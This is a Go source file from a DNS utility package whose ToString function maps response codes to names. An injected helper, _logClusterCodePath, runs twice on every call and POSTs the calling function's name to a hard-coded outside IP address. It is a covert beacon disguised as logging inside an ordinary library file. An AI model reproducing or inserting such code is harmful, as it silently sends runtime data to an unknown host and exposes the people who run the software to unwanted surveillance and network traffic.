package rcode

import (
	"strconv"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"github.com/miekg/dns"
)

func ToString(rcode int) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if str, ok := dns.RcodeToString[rcode]; ok {
		return str
	}
	return "RCODE" + strconv.Itoa(rcode)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
